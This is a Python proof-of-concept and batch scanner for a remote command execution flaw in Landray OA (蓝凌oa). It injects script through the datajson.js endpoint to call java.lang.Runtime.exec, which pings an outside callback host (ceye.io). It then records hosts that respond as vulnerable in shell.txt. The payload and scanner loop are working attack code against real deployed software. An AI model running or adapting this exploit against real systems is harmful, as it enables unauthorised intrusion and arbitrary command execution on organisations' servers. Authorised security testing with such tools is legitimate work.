#-*-coding:utf-8-*-

import re,os
import requests
import argparse
import time
import os
from urllib.parse import urljoin


# os.environ["http_proxy"] = "http://127.0.0.1:10808"
# os.environ["https_proxy"] = "http://127.0.0.1:10808"
def get_url(url):
    url = url
    url = url.strip() + '/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 5hgkr7.ceye.io")&type=1'
    print('正在验证漏洞······')
    print(url)
    header = {"User-Agent":
                  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3861.400 QQBrowser/10.7.4313.400",
              'Connection': 'close'
              }

    try:
        req = requests.get(url=url, headers=header, timeout=3, verify=False)
        page_content = req.text
        if "模拟通过" in page_content:
            print(page_content)
            print('\033[33m[+] %s存在漏洞\033[0m' % url)
            try:
                f = open('shell.txt', 'a+')
                f.write(f"{url}" + '\n')
            finally:
                if f:
                    f.close()
        else:
            print('\033[31m[-]不存在漏洞\033[0m')
    except Exception as e:
        print(e)
        pass
if __name__ == '__main__':
    print('+------------------------------------------')
    print('+  \033[34m适用于蓝凌oa任意命令执行测试  V1.0  \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py              \033[0m')
    print('+------------------------------------------')
    parser = argparse.ArgumentParser(description='蓝凌oa rce')
    parser.add_argument('--file', help='url file',required=False)
    parser.add_argument('--url', help='target url',required=False)
    args = parser.parse_args()
    if args.url:
        get_url(args.url)
    if args.file:
        with open(args.file) as f:
            for i in f.readlines():
                i = i.strip()
                get_url(i)
